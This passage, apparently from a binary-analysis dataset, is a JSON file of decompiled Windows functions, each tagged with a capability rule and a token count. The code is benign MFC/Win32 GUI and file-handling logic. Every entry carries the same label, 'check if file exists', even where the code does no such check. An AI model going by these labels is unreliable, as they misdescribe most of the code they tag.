fcn.0045e756(*(iVar3 + 0xc));\n            }\n            iVar2 = fcn.0045ea05(*(iVar2 + 0x98));\n            *(iVar3 + 0xc) = iVar2;\n            if ((iVar2 == 0) && (arg_8h != 0)) {\n                uVar5 = fcn.0045ea05(arg_8h);\n                *(iVar3 + 0xc) = uVar5;\n            }\n        }\n    }\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 531
    },
    "004338a4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004338a4(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n    if (iVar2 < 0) {\n        return;\n    }\n    iVar3 = fcn.004302e1();\n    var_8h = iVar3;\n    (*_sym.imp.USER32.dll_GetCursorPos)(&var_10h);\n    (*_sym.imp.USER32.dll_ScreenToClient)(in_ECX[8], &var_10h);\n    var_4h = (**(*in_ECX + 0x6c))(var_10h, var_ch, 0);\n    if (var_4h < 0) {\n        *(iVar3 + 0x4c) = 0xffffffff;\n    }\n    else {\n        iVar4 = fcn.00419eed();\n        iVar5 = fcn.0041b0a5();\n        if (iVar5 == 0) {\ncode_r0x0043391f:\n            var_4h = -1;\n        }\n        else {\n            if (iVar4 == 0) {\n                fcn.00411e42();\n            }\n            iVar5 = fcn.0041bf9b();\n            if (iVar5 == 0) goto code_r0x0043391f;\n        }\n        if (*(iVar3 + 0x3c) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = *(*(iVar3 + 0x3c) + 0x20);\n        }\n        uVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        piVar7 = fcn.004185c5(uVar6);\n        if (piVar7 != in_ECX) {\n            if (piVar7 == NULL) {\n                iVar5 = 0;\n            }\n            else {\n                iVar5 = piVar7[8];\n            }\n            if ((iVar5 != iVar3) && (iVar3 = fcn.00419eed(),  iVar3 == iVar4)) {\n                var_4h = -1;\n            }\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_KillTimer;\n    if (-1 < var_4h) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[8], &var_10h);\n        iVar3 = (*_sym.imp.USER32.dll_WindowFromPoint)(var_10h, var_ch);\n        if (iVar3 == 0) {\ncode_r0x004339b4:\n            var_4h = -1;\n            *(var_8h + 0x4c) = 0xffffffff;\n        }\n        else if ((iVar3 != in_ECX[8]) && (iVar4 = (*_sym.imp.USER32.dll_IsChild)(in_ECX[8], iVar3),  iVar4 == 0)) {\n            iVar4 = *(var_8h + 0x3c);\n            if (iVar4 != 0) {\n                iVar4 = *(iVar4 + 0x20);\n            }\n            if (iVar4 != iVar3) goto code_r0x004339b4;\n        }\n        if (-1 < var_4h) goto code_r0x004339e4;\n    }\n    if (*(var_8h + 0x4c) == -1) {\n        (*pcVar1)(in_ECX[8], 0xe001);\n    }\n    (**(*in_ECX + 0x164))(0xffffffff);\ncode_r0x004339e4:\n    if ((arg_8h == 0xe000) && ((*pcVar1)(in_ECX[8], 0xe000),  -1 < var_4h)) {\n        (**(*in_ECX + 0x164))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 929
    },
    "00433d00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433d00(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((in_ECX[0x23] != 0) && (iVar1 = (**(*in_ECX + 0x6c))(arg_ch, arg_10h, 0),  iVar1 == -1)) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[8], &arg_ch);\n        (***in_ECX[0x24])(arg_ch, arg_10h);\n        return;\n    }\n    fcn.00418521();\n    return;\n}\n",
        "token_count": 154
    },
    "0043600b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.0043600b(uint wParam)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint nWidth;\n    uint nHeight;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x18);\n    if (*(unaff_EBP + 8) != -1) {\n        uVar2 = fcn.00438d21();\n        (*_sym.imp.USER32.dll_GetClientRect)(*(extraout_ECX + 0x20), unaff_EBP + -0x24);\n        *(unaff_EBP + -0x10) = 0;\n        *(unaff_EBP + -0x14) = vtable.CRgn.0;\n        *(unaff_EBP + -4) = 0;\n        uVar3 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(unaff_EBP + -0x24);\n        fcn.0042e438(uVar3);\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(*(extraout_ECX + 0x20));\n        iVar4 = fcn.0042e163(uVar3);\n        fcn.0042dd0d(unaff_EBP + -0x14);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x20), 0x198, *(unaff_EBP + 8), unaff_EBP + -0x24);\n        iVar1 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -2;\n        *(unaff_EBP + -0x18) = iVar1 + 2;\n        uVar2 = fcn.0042e5d1(uVar2);\n        (*_sym.imp.GDI32.dll_PatBlt)\n                  (*(iVar4 + 4), *(unaff_EBP + -0x24), *(unaff_EBP + -0x20), *(unaff_EBP + -0x1c) - *(unaff_EBP + -0x24)\n                   , *(unaff_EBP + -0x18) - *(unaff_EBP + -0x20), 0x5a0049);\n        fcn.0042e5d1(uVar2);\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(extraout_ECX + 0x20), *(iVar4 + 4));\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x14) = vtable.CGdiObject.0;\n        fcn.0042e48b();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 769
    },
    "00436310": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436310(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_ECX;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    \n    var_14h = arg_ch;\n    var_1ch = arg_10h;\n    var_20h = 5;\n    if (arg_14h != -1) {\n        var_20h = 7;\n        var_18h = arg_14h;\n    }\n    if (arg_18h != -1) {\n        var_20h = var_20h | 8;\n        var_ch = arg_18h;\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x101b, arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 234
    },
    "00436b14": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00436b14(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != -1;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00437d9e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00437d9e(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    \n    if (in_ECX != NULL) goto code_r0x00437dae;\n    do {\n        fcn.00411e42();\ncode_r0x00437dae:\n    } while ((arg_8h == 0) || (iVar1 = fcn.00437984(arg_8h, arg_ch),  iVar1 < 1));\n    if (arg_10h == 1) {\n        puVar2 = fcn.00437755(iVar1);\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x20));\n        *puVar2 = uVar3 & 0xffff;\n        fcn.00437755(iVar1);\n        iVar4 = fcn.00437984();\n        if (0 < iVar4) {\n            fcn.0044be28(iVar1, 1);\n            piVar5 = fcn.00437755();\n            if ((*piVar5 == 0) && (piVar5 = fcn.00437755(),  *piVar5 == 0)) {\n                fcn.0044be28(iVar1, 1);\n            }\n        }\n    }\n    else {\n        fcn.0044be28(iVar1, 1);\n        piVar5 = fcn.00437755(iVar1 + -1);\n        if ((*piVar5 == 0) && (piVar5 = fcn.00437755(iVar1),  *piVar5 == 0)) {\n            fcn.0044be28(iVar1, 1);\n        }\n        if (arg_10h != -1) {\n            fcn.00437d37(arg_8h);\n        }\n    }\n    if (*(arg_8h + 0x90) != 0) {\n        piVar5 = fcn.0041fab8();\n        if ((in_ECX[0x25] == 0) || (iVar1 = (**(*in_ECX + 0x16c))(),  iVar1 != 0)) {\n            piVar5[0x34] = piVar5[0x34] | 0xc;\n        }\n        else {\n            iVar1 = fcn.00437ccf();\n            if (iVar1 == 0) {\n                (**(*piVar5 + 0x60))();\n                return 1;\n            }\n            fcn.0041bf7a(0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 622
    },
    "0043b1cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0043b1cc(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    ulong uVar3;\n    \n    iVar1 = in_ECX[2];\n    if (iVar1 == 0) {\n        if (arg_ch == 0) {\n            *arg_8h = 0;\n            arg_8h[1] = -0x80000000;\n        }\n        else {\n            if (((arg_ch != -1) || (*in_ECX != 0)) || (in_ECX[1] != -0x80000000)) {\n                uVar3 = fcn.00464ac0(*in_ECX, in_ECX[1], arg_ch, arg_ch >> 0x1f);\n                *arg_8h = uVar3;\n                arg_8h[1] = uVar3 >> 0x20;\n                arg_8h[2] = 0;\n                return arg_8h;\n            }\n            *arg_8h = -1;\n            arg_8h[1] = 0x7fffffff;\n        }\n        arg_8h[2] = 1;\n    }\n    else {\n        iVar2 = in_ECX[1];\n        *arg_8h = *in_ECX;\n        arg_8h[1] = iVar2;\n        arg_8h[2] = iVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 342
    },
    "0043fab8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fab8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(param_1 + 4) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        bVar3 = iVar1 == 0;\n    }\n    *(param_1 + 4) = 0xffffffff;\n    *(param_1 + 8) = 0;\n    fcn.0041372f();\n    if (bVar3) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(*(param_1 + 0xc));\n        fcn.00441745(uVar2);\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "0043fafb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fafb(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    \n    if (*(param_1 + 4) != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        *(param_1 + 4) = 0xffffffff;\n    }\n    puVar1 = param_1 + 0xc;\n    uVar2 = *puVar1;\n    uVar5 = uVar2;\n    piVar3 = *(uVar2 - 0x10);\n    if (*(uVar2 - 0xc) != 0) {\n        if (*(uVar2 - 4) < 0) {\n            if (*(uVar2 - 8) < 0) {\n                uVar5 = fcn.00401280(0x80070057);\n            }\n            *(uVar5 + -0xc) = uVar5 >> 0x20;\n            **puVar1 = uVar5 >> 0x20;\n        }\n        else {\n            fcn.00402740();\n            iVar4 = (**(*piVar3 + 0xc))();\n            *puVar1 = iVar4 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "0043fe1f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0043fe1f(uchar *param_1, uchar *param_2, uchar *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar *puStack360;\n    uchar *puStack356;\n    uchar *puStack352;\n    uchar *puStack348;\n    uchar *puStack344;\n    uint uStack340;\n    uchar *puStack336;\n    uchar *puStack332;\n    uint arg_8h;\n    uchar auStack284 [276];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ &stack0xfffffeb8;\n    arg_8h = 0x14;\n    puStack332 = 0x43fe43;\n    fcn.004627af();\n    puStack352 = param_3;\n    if (param_1 != NULL) goto code_r0x0043fe68;\n    do {\n        puStack332 = 0x43fe68;\n        fcn.00411e42();\ncode_r0x0043fe68:\n    } while (param_2 == NULL);\n    puStack332 = &stack0xfffffea4;\n    puStack336 = param_1;\n    uStack340 = 0x104;\n    puStack344 = param_2;\n    puStack348 = 0x43fe85;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetFullPathNameA)();\n    if (uVar1 == 0) {\n        puStack348 = 0xffffffff;\n        puStack352 = param_2;\n        puStack356 = 0x104;\n        puStack360 = param_1;\n        fcn.00411e90();\n        puStack348 = param_2;\n        puStack356 = 0x43fe9f;\n        fcn.0043fdf4();\n        goto code_r0x0043ff71;\n    }\n    if (0x103 < uVar1) goto code_r0x0043ff71;\n    puStack348 = 0x43feaf;\n    puStack348 = fcn.0042407a();\n    puStack352 = 0x43feb8;\n    fcn.0040f840();\n    puStack332 = NULL;\n    puStack352 = &stack0xfffffea8;\n    puStack356 = param_1;\n    puStack360 = 0x43fec6;\n    fcn.0043fc7d();\n    puStack360 = puStack344;\n    puStack348 = (*_sym.imp.SHLWAPI.dll_PathIsUNCA)();\n    if (puStack348 == NULL) {\n        puStack356 = &stack0xfffffe9c;\n        puStack360 = &stack0xfffffe98;\n        puStack352 = puStack348;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)(puStack344, 0, 0, 0);\n        if (iVar2 == 0) {\n            puStack348 = param_2;\n            puStack356 = 0x43fefa;\n            fcn.0043fdf4();\n            goto code_r0x0043fefa;\n        }\n        if ((puStack356 & 2) == 0) {\n            puStack348 = param_1;\n            puStack352 = 0x43ff14;\n            (*_sym.imp.USER32.dll_CharUpperA)();\n        }\n        if ((puStack356 & 4) == 0) {\n            puStack352 = param_2;\n            puStack356 = 0x43ff25;\n            puStack348 = &stack0xfffffeb8;\n            puStack348 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)();\n            if (puStack348 != 0xffffffff) {\n                puStack352 = 0x43ff31;\n                (*_sym.imp.KERNEL32.dll_FindClose)();\n                if ((puStack348 != NULL) && (param_1 < puStack348)) {\n                    puStack348 = &stack0xfffffee4;\n                    puStack352 = 0x43ff46;\n                    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n                    if (iVar2 + (puStack348 - param_1) < 0x104) {\n                        puStack356 = &stack0xfffffee4;\n                        puStack352 = 0x104 - (puStack348 - param_1);\n                        puStack360 = 0x43ff60;\n                        puStack348 = puStack356;\n                        fcn.00424fd8();\n                        goto code_r0x0043ff63;\n                    }\n                }\ncode_r0x0043fefa:\n                puStack348 = 0x43ff05;\n                fcn.00402740();\n                goto code_r0x0043ff71;\n            }\n        }\n    }\ncode_r0x0043ff63:\n    puStack348 = 0x43ff6e;\n    fcn.00402740();\ncode_r0x0043ff71:\n    *in_FS_OFFSET = uStack340;\n    puStack332 = 0x43ff8c;\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 1131
    },
    "00440019": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00440019(int32_t param_1, int32_t param_2, uint32_t param_3, uint param_4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint in_stack_fffffedc;\n    uint uStack276;\n    uchar auStack268 [104];\n    uchar auStack164 [156];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack164;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0xffffffff;\n    fcn.0041372f();\n    if (((param_2 == 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_2),  0x103 < iVar2)) ||\n       (iVar2 = param_2,  iVar3 = fcn.0043fe1f(),  iVar3 == 0)) goto code_r0x00440196;\n    fcn.00413a3a(auStack268);\n    uVar4 = param_3 & 3;\n    uStack276 = 0;\n    if (uVar4 == 0) {\n        uStack276 = 0x80000000;\n    }\n    else if (uVar4 == 1) {\n        uStack276 = 0x40000000;\n    }\n    else if (uVar4 == 2) {\n        uStack276 = 0xc0000000;\n    }\n    uVar4 = param_3 & 0x70;\n    uVar5 = 1;\n    if ((uVar4 == 0) || (uVar4 == 0x10)) {\ncode_r0x004400f6:\n        uVar5 = 0;\n    }\n    else if (uVar4 != 0x20) {\n        if (uVar4 == 0x30) {\n            uVar5 = 2;\n        }\n        else {\n            uVar5 = 3;\n            if (uVar4 != 0x40) goto code_r0x004400f6;\n        }\n    }\n    in_stack_fffffedc = 0xc;\n    if ((param_3 & 0x1000) == 0) {\n        cVar1 = '\\x03';\n    }\n    else {\n        cVar1 = (-((param_3 & 0x2000) != 0) & 2U) + 2;\n    }\n    uVar4 = 0x80;\n    if ((param_3 & 0x10000) != 0) {\n        uVar4 = 0x20000080;\n    }\n    if ((param_3 & 0x20000) != 0) {\n        uVar4 = uVar4 | 0x80000000;\n    }\n    if ((param_3 & 0x40000) != 0) {\n        uVar4 = uVar4 | 0x10000000;\n    }\n    if ((param_3 & 0x80000) != 0) {\n        uVar4 = uVar4 | 0x8000000;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_2, uStack276, uVar5, &stack0xfffffedc, cVar1, uVar4, 0);\n    if (iVar3 == -1) {\n        fcn.0043fdf4(iVar2, param_2, param_4);\n    }\n    else {\n        *(param_1 + 4) = iVar3;\n        *(param_1 + 8) = 1;\n    }\ncode_r0x00440196:\n    fcn.0045e747(in_stack_fffffedc);\n    return;\n}\n",
        "token_count": 854
    },
    "00440aa2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00440aa2(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch, \n            uint arg_20h)\n\n{\n    uint *in_ECX;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    uint32_t unaff_EDI;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_4h;\n    \n    iVar1 = unaff_EBX;\n    uVar2 = unaff_EDI;\n    if (0x76b < arg_8h) goto code_r0x00440abe;\n    do {\n        do {\n            fcn.00401280();\n            iVar1 = unaff_EBX;\n            uVar2 = unaff_EDI;\ncode_r0x00440abe:\n            unaff_EBX = arg_ch;\n            unaff_EDI = uVar2;\n        } while ((((0xb < arg_ch - 1U) || (0x1e < arg_10h - 1U)) || (unaff_EDI = arg_14h,  0x17 < arg_14h)) ||\n                ((0x3b < arg_18h || (0x3b < arg_1ch))));\n        var_24h = arg_1ch;\n        var_10h = arg_8h + -0x76c;\n        var_4h = arg_20h;\n        var_14h = arg_ch + -1;\n        var_20h = arg_18h;\n        var_1ch = arg_14h;\n        var_18h = arg_10h;\n        unaff_EDI = uVar2;\n        unaff_EBX = iVar1;\n        iVar3 = fcn.00465094(&var_24h, uVar2, iVar1);\n        *in_ECX = iVar3;\n        in_ECX[1] = iVar3 >> 0x20;\n    } while (iVar3 == -1);\n    return;\n}\n",
        "token_count": 518
    },
    "00440ee1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440ee1(uint arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint *var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    var_ch = NULL;\n    var_8h = NULL;\n    var_4h = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(arg_8h);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (var_4h == 0xffffffff) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(arg_8h);\n        fcn.00441745(uVar2);\n    }\n    if ((*(arg_ch + 8) != var_4h) && ((var_4h & 1) != 0)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetFileAttributesA)(arg_8h, *(arg_ch + 8));\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.00441745(uVar2);\n        }\n    }\n    if ((arg_ch[2] | arg_ch[3]) != 0) {\n        fcn.00440e46(arg_ch + 2, &var_24h);\n        if ((arg_ch[4] | arg_ch[5]) != 0) {\n            fcn.00440e46(arg_ch + 4, &var_14h);\n            var_8h = &var_14h;\n        }\n        if ((*arg_ch | arg_ch[1]) != 0) {\n            fcn.00440e46(arg_ch, &var_1ch);\n            var_ch = &var_1ch;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n        if (iVar3 == -1) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.00441745(uVar2);\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar3, var_ch, var_8h, &var_24h);\n        if (iVar4 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.00441745(uVar2);\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.00441745(uVar2);\n        }\n    }\n    if ((*(arg_ch + 8) != var_4h) && ((var_4h & 1) == 0)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetFileAttributesA)(arg_8h, *(arg_ch + 8));\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.00441745(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 750
    },
    "0044104a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044104a(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t in_ECX;\n    uint var_20h;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    fcn.00462290(arg_8h, 0, 0x128);\n    fcn.00411e90(arg_8h + 0x22, 0x104, *(in_ECX + 0xc), 0xffffffff);\n    if (*(in_ECX + 4) == *0x498a50) {\ncode_r0x00441199:\n        uVar2 = 1;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileTime)\n                          (*(in_ECX + 4), &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if (iVar1 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(in_ECX + 4), 0);\n            arg_8h[6] = uVar3;\n            arg_8h[7] = 0;\n            if (uVar3 != 0xffffffff) {\n                if (*(*(in_ECX + 0xc) + -0xc) == 0) {\n                    *(arg_8h + 8) = 0;\n                }\n                else {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(*(in_ECX + 0xc));\n                    *(arg_8h + 8) = (iVar1 == -1) - 1U & iVar1;\n                }\n                iVar1 = fcn.00440a61(&lpCreationTime);\n                if (iVar1 == 0) {\n                    *arg_8h = 0;\n                    arg_8h[1] = 0;\n                }\n                else {\n                    puVar4 = fcn.00440b8d(&lpCreationTime, 0xffffffff);\n                    *arg_8h = *puVar4;\n                    arg_8h[1] = puVar4[1];\n                }\n                iVar1 = fcn.00440a61(&lpLastAccessTime);\n                if (iVar1 == 0) {\n                    arg_8h[4] = 0;\n                    arg_8h[5] = 0;\n                }\n                else {\n                    puVar4 = fcn.00440b8d(&lpLastAccessTime, 0xffffffff);\n                    arg_8h[4] = *puVar4;\n                    arg_8h[5] = puVar4[1];\n                }\n                iVar1 = fcn.00440a61(&lpLastWriteTime);\n                if (iVar1 == 0) {\n                    arg_8h[2] = 0;\n                    arg_8h[3] = 0;\n                }\n                else {\n                    puVar4 = fcn.00440b8d(&lpLastWriteTime, 0xffffffff);\n                    arg_8h[2] = *puVar4;\n                    arg_8h[3] = puVar4[1];\n                }\n                if ((*arg_8h | arg_8h[1]) == 0) {\n                    *arg_8h = arg_8h[2];\n                    arg_8h[1] = arg_8h[3];\n                }\n                if ((arg_8h[4] | arg_8h[5]) == 0) {\n                    arg_8h[4] = arg_8h[2];\n                    arg_8h[5] = arg_8h[3];\n                }\n                goto code_r0x00441199;\n            }\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 858
    },
    "00442755": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00442755(uint noname_0, uint nNumber)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    fcn.00441a8b(&var_8h, &var_4h);\n    if ((var_4h == NULL) && (var_8h == NULL)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0044178a();\n        iVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(-nNumber, iVar1, 0x78);\n        if (var_4h == NULL) {\n            if (var_8h == NULL) {\n                return 0;\n            }\n            if (iVar1 == -1) {\n                iVar1 = in_ECX[0x1c];\n                if (0 < nNumber) {\n                    iVar1 = -in_ECX[0x1c];\n                }\n            }\n            else {\n                iVar1 = in_ECX[0x1e] * iVar2;\n                if (in_ECX[0x1c] <= in_ECX[0x1e] * iVar2) {\n                    iVar1 = in_ECX[0x1c];\n                }\n            }\n            iVar3 = 0;\n        }\n        else {\n            if (iVar1 == -1) {\n                iVar3 = in_ECX[0x1d];\n                if (0 < nNumber) {\n                    iVar3 = -in_ECX[0x1d];\n                }\n            }\n            else {\n                iVar3 = in_ECX[0x1f] * iVar2;\n                if (in_ECX[0x1d] <= in_ECX[0x1f] * iVar2) {\n                    iVar3 = in_ECX[0x1d];\n                }\n            }\n            iVar1 = 0;\n        }\n        iVar1 = (**(*in_ECX + 0x13c))(iVar1, iVar3, 1);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(in_ECX[8]);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 527
    },
    "00442e3c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442e3c(int32_t param_1)\n\n{\n    fcn.00418521();\n    if (*(param_1 + 0x5c) == -1) {\n        fcn.00442bbe(*(param_1 + 0x60), *(param_1 + 100));\n    }\n    else {\n        fcn.00442557();\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00449173": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
